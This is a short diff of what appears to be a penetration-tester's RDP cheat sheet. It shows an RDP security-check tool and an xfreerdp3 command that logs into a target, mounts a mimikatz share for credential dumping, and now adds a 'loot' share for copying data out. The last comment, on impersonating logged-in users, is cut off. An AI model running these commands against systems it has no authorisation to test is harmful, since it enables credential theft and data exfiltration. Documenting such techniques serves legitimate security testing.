@@ -21,7 +21,7 @@ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-che
 ./rdp-sec-check.pl <TARGET>
 
 # Connects to RDP and mounts mimikatz share
-xfreerdp3 +multitransport /clipboard /dynamic-resolution /cert:ignore /v:<TARGET> /u:<USER> /p:'<PASSWORD>' /drive:'/usr/share/windows-resources/mimikatz/x64',share
+mkdir loot; xfreerdp3 +multitransport /clipboard /dynamic-resolution /cert:ignore /v:<TARGET> /u:<USER> /p:'<PASSWORD>' /drive:'/usr/share/windows-resources/mimikatz/x64',share /drive:"$HOME/loot",loot
 
 # Impersonate other logged-in user
 # NOTE: needs SYSTEM
